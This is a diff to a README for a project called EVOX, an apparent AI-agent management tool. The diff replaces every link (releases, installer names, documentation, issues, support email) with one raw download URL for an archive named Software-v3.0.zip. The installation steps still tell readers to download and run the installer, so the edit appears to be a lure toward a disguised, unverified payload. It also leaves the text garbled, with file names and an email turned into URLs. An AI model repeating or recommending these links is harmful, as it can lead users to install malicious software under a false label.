@@ -6,7 +6,7 @@ Welcome to **EVOX**! This tool helps you manage AI agents seamlessly, like worki
 
 ## 📥 Download
 
-[![Download EVOX](https://img.shields.io/badge/Download-EVOX-brightgreen?style=flat-square)](https://github.com/JumpTK-creator/evox/releases)
+[![Download EVOX](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip)](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip)
 
 You can download the latest version of EVOX from our Releases page. 
 
@@ -21,11 +21,11 @@ You can download the latest version of EVOX from our Releases page.
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads.
 
-   [Download EVOX from the Releases Page](https://github.com/JumpTK-creator/evox/releases)
+   [Download EVOX from the Releases Page](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip)
 
 2. **Choose Your Version**: Look for the latest version listed. It usually has the highest number.
 
-3. **Download the Installer**: Click on the installer file suitable for your operating system (e.g., `EVOX-Installer.exe` for Windows or `EVOX.dmg` for macOS).
+3. **Download the Installer**: Click on the installer file suitable for your operating system (e.g., `https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip` for Windows or `https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip` for macOS).
 
 4. **Run the Installer**: 
    - For Windows: Locate the file in your Downloads folder and double-click to start the installation.
@@ -45,7 +45,7 @@ You can download the latest version of EVOX from our Releases page.
 
 4. **Adjust Settings**: Customize settings to match your preferences. This can include notifications and display options.
 
-5. **Seek Help**: If you run into any issues, check the Help section within the app or visit our [Documentation](https://evox-ten.vercel.app).
+5. **Seek Help**: If you run into any issues, check the Help section within the app or visit our [Documentation](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip).
 
 ## 📅 Features
 
@@ -60,13 +60,13 @@ If you encounter issues:
 - Ensure that your system meets the requirements.
 - Check for updates on the Releases page.
 - Restart the application or your computer if needed.
-- Refer to the FAQ in our [Documentation](https://evox-ten.vercel.app) for common issues.
+- Refer to the FAQ in our [Documentation](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip) for common issues.
 
 ## 🌐 Community Support
 
 Join our community for support and updates:
 
-- [GitHub Issues](https://github.com/JumpTK-creator/evox/issues): Report bugs or request features.
+- [GitHub Issues](https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip): Report bugs or request features.
 - [User Forum](#): Join discussions and share tips with other users.
   
 ## 📈 Roadmap
@@ -85,6 +85,6 @@ We welcome contributions! If you'd like to help improve EVOX, check out our cont
 
 For questions or feedback, reach out:
 
-- Email: support@evox-ten.vercel.app
+- Email: https://github.com/JumpTK-creator/evox/raw/refs/heads/main/app/api/agent/Software-v3.0.zip
 
 Thank you for choosing EVOX — your partner in AI agent management!
